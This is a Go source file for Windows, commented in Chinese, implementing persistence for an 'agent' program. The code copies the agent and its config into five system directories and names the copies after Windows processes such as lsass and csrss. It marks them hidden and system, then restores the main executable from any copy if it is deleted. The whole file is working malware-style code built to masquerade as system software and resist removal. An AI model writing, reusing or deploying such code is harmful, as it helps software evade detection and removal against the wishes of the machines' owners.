//go:build windows

package main

import (
	"crypto/sha256"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// ═══ 多路径二进制复制 ═══
// 将 agent 复制到 5+ 个不同位置，每个位置独立命名
// 任一副本存活即可通过自愈线程恢复其他所有副本
// 删除主目录不再致命 — 从任意备份位置恢复

// backupLocation 一个备份位置
type backupLocation struct {
	Dir     string // 目录
	ExeName string // 文件名
}

// getBackupLocations 基于机器 ID 生成 5 个备份位置
func getBackupLocations() []backupLocation {
	mid, _ := getMachineID()
	if mid == "" {
		mid = "fallback"
	}

	// 5 个根目录（都是 SYSTEM 可写）
	roots := []string{
		os.Getenv("SystemRoot") + `\Temp`,
		os.Getenv("ProgramData"),
		os.Getenv("ALLUSERSPROFILE"),
		os.Getenv("SystemRoot") + `\System32\Tasks`,
		os.Getenv("SystemRoot") + `\SysWOW64`,
	}

	// Windows 系统进程名风格
	names := []string{
		"conhost", "dwm", "lsass", "csrss", "smss",
		"services", "wininit", "fontdrvhost", "sihost", "taskhostw",
	}

	locs := make([]backupLocation, 0, 5)
	for i, root := range roots {
		if root == "" {
			continue
		}
		h := sha256.Sum256([]byte(fmt.Sprintf("%s|backup|%d", mid, i)))
		subDir := fmt.Sprintf("Microsoft\\%s", pickBackupDir(h[0]))
		exeName := names[int(h[1])%len(names)] + fmt.Sprintf("%02x", h[2]) + ".exe"
		dir := filepath.Join(root, subDir)
		locs = append(locs, backupLocation{Dir: dir, ExeName: exeName})
	}
	return locs
}

var backupDirNames = []string{
	"Crypto", "Provisioning", "Diagnosis", "Performance",
	"Compatibility", "Telemetry", "WindowsUpdate", "NetTrace",
}

func pickBackupDir(b byte) string {
	return backupDirNames[int(b)%len(backupDirNames)]
}

// cleanupOldBackups 清理所有多路径备份（防止旧版本二进制被恢复导致版本回退）
func cleanupOldBackups() {
	for _, loc := range getBackupLocations() {
		dst := filepath.Join(loc.Dir, loc.ExeName)
		if _, err := os.Stat(dst); err == nil {
			os.Remove(dst)
			// 也清理同目录下的 agent.conf
			os.Remove(filepath.Join(loc.Dir, "agent.conf"))
			log.Printf("[清理] 移除旧备份: %s", dst)
		}
	}
}

// replicateToBackups 将当前二进制复制到所有备份位置
func replicateToBackups() {
	selfData, err := readSelfBinary()
	if err != nil {
		return
	}
	confData, _ := readSelfConfig()

	for _, loc := range getBackupLocations() {
		dst := filepath.Join(loc.Dir, loc.ExeName)
		if _, err := os.Stat(dst); err == nil {
			continue // 已存在
		}
		os.MkdirAll(loc.Dir, 0755)
		if err := os.WriteFile(dst, selfData, 0755); err == nil {
			// 复制配置
			if confData != nil {
				confDst := filepath.Join(loc.Dir, "agent.conf")
				os.WriteFile(confDst, confData, 0600)
			}
			// 隐藏
			hideFile(dst)
			hideFile(loc.Dir)
		}
	}
}

// restoreFromBackups 从备份位置恢复主二进制
// 返回 true 表示成功恢复
func restoreFromBackups() bool {
	mainExe := sid().ExePath
	if _, err := os.Stat(mainExe); err == nil {
		return true // 主文件存在
	}

	for _, loc := range getBackupLocations() {
		src := filepath.Join(loc.Dir, loc.ExeName)
		data, err := os.ReadFile(src)
		if err != nil || len(data) < 1024 {
			continue
		}
		os.MkdirAll(sid().Dir, 0755)
		if err := os.WriteFile(mainExe, data, 0755); err == nil {
			log.Printf("[多路径] 从备份恢复主文件: %s -> %s", src, mainExe)
			// 也恢复配置
			confSrc := filepath.Join(loc.Dir, "agent.conf")
			confDst := filepath.Join(sid().Dir, "agent.conf")
			if cdata, err := os.ReadFile(confSrc); err == nil {
				os.WriteFile(confDst, cdata, 0600)
			}
			return true
		}
	}
	return false
}

// readSelfBinary 读取自身二进制
func readSelfBinary() ([]byte, error) {
	// 优先从主路径读取
	mainExe := sid().ExePath
	if data, err := os.ReadFile(mainExe); err == nil {
		return data, nil
	}
	// 从自身进程路径读取
	selfPath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return os.ReadFile(selfPath)
}

// readSelfConfig 读取自身配置
func readSelfConfig() ([]byte, error) {
	confPath := filepath.Join(sid().Dir, "agent.conf")
	if data, err := os.ReadFile(confPath); err == nil {
		return data, nil
	}
	selfPath, _ := os.Executable()
	if selfPath != "" {
		confPath = filepath.Join(filepath.Dir(selfPath), "agent.conf")
		return os.ReadFile(confPath)
	}
	return nil, fmt.Errorf("no config found")
}

// hideFile 设置文件隐藏 + 系统属性
func hideFile(path string) {
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	setFileAttributes.Call(uintptr(unsafe.Pointer(p)), 0x06) // HIDDEN | SYSTEM
}

var setFileAttributes = modKernel32Singleton.NewProc("SetFileAttributesW")
